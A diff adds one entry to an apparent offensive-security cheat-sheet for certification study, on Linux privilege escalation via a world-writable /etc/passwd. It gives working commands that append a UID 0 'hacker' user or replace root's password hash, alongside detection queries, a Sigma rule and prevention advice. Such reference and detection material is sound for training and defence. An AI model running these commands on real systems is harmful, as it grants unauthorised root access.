@@ -1,0 +1,85 @@
+{
+  "id": "linux-writable-passwd",
+  "name": "Writable /etc/passwd - Add Root-Equivalent User",
+  "command": "openssl passwd -1 newpass",
+  "description": "If /etc/passwd is world-writable (misconfiguration), you can add a new user with UID 0 (root equivalent) or replace root's password hash directly. Works because Linux checks /etc/passwd before /etc/shadow for password hashes if present. One of the fastest linux privesc paths.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Miscellaneous",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Linux privilege escalation methodology",
+  "tags": [
+    "writable-passwd",
+    "privesc",
+    "linux",
+    "uid-0",
+    "password-hash",
+    "misconfiguration"
+  ],
+  "mitre": [
+    "T1078.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CHECK ===\n  ls -la /etc/passwd\n  # Look for -rw-rw-rw- or any write permission for your user/group\n\n=== METHOD 1: Add new root user ===\n  # Generate password hash\n  openssl passwd -1 newpass\n  # Output: $1$xyz$...\n\n  # Add user with UID 0\n  echo 'hacker:$1$xyz$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n  # Switch to new user\n  su hacker\n  # Password: newpass\n  # You are now root (UID 0)\n\n=== METHOD 2: Replace root password ===\n  # Generate hash\n  openssl passwd -1 newpass\n  # Edit root's entry to include the hash\n  # Change root:x: to root:$1$xyz$hash:\n\n=== METHOD 3: Python one-liner ===\n  python3 -c \"import crypt; print('hacker:' + crypt.crypt('pass123') + ':0:0::/root:/bin/bash')\" >> /etc/passwd\n\n=== WHY IT WORKS ===\nHistorically, password hashes were stored in /etc/passwd (the 'x'\nin the second field means 'look in /etc/shadow instead'). If you\nput an actual hash there, Linux uses it directly, bypassing shadow.\n\n=== ALSO CHECK ===\n  ls -la /etc/shadow    # writable shadow = same attack\n  ls -la /etc/sudoers   # writable sudoers = add sudo rights",
+  "examples": [
+    {
+      "label": "Generate password hash and add root user",
+      "command": "openssl passwd -1 newpass && echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd"
+    },
+    {
+      "label": "Check /etc/passwd permissions",
+      "command": "ls -la /etc/passwd /etc/shadow /etc/sudoers"
+    },
+    {
+      "label": "Python method",
+      "command": "python3 -c \"import crypt; print('hacker:' + crypt.crypt('pass123') + ':0:0::/root:/bin/bash')\" >> /etc/passwd"
+    }
+  ],
+  "references": [
+    {
+      "title": "GTFOBins - /etc/passwd",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "Linux Privesc - Writable Files",
+      "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Linux reads /etc/passwd for user information and falls back to password hashes stored there if the 'x' placeholder is replaced with an actual hash.",
+    "prerequisites": "Write access to /etc/passwd (misconfiguration).",
+    "impact": "Immediate root access by creating a UID 0 user.",
+    "detection": "[MITRE T1078.003] Modifications to /etc/passwd; new UID 0 users; file integrity monitoring alerts.",
+    "artifacts": "Modified /etc/passwd with new entries; new UID 0 user in the system.",
+    "splunk_spl": "index=linux sourcetype=linux:audit name=\"/etc/passwd\" key=\"success\"\n| where syscall=\"open\" AND (a1=\"O_WRONLY\" OR a1=\"O_RDWR\")\n| table _time, uid, exe, key",
+    "elastic_kql": "file.path:\"/etc/passwd\" AND event.action:\"opened-for-write\"",
+    "sentinel_kql": "Syslog\n| where SyslogMessage contains \"/etc/passwd\" and SyslogMessage contains \"WRITE\"\n| project TimeGenerated, Computer, SyslogMessage",
+    "sigma_rules": "lnx_file_write_etc_passwd",
+    "prevention": "Ensure /etc/passwd is owned by root with 644 permissions; use file integrity monitoring (AIDE, OSSEC); enforce /etc/shadow for password storage.",
+    "sources": [
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/",
+      "https://attack.mitre.org/techniques/T1078/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "Write to /etc/passwd",
+        "logic": "title: Modification of /etc/passwd\nstatus: stable\nlogsource:\n  product: linux\n  service: auditd\ndetection:\n  selection:\n    type: PATH\n    name: '/etc/passwd'\n  filter:\n    key: 'shadow-utils'\n  condition: selection and not filter\nlevel: critical",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1078.003"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate user management via useradd/usermod (filtered by key)",
+        "tuning": "Exclude changes by known user management tools via audit key filtering"
+      }
+    ]
+  }
+}
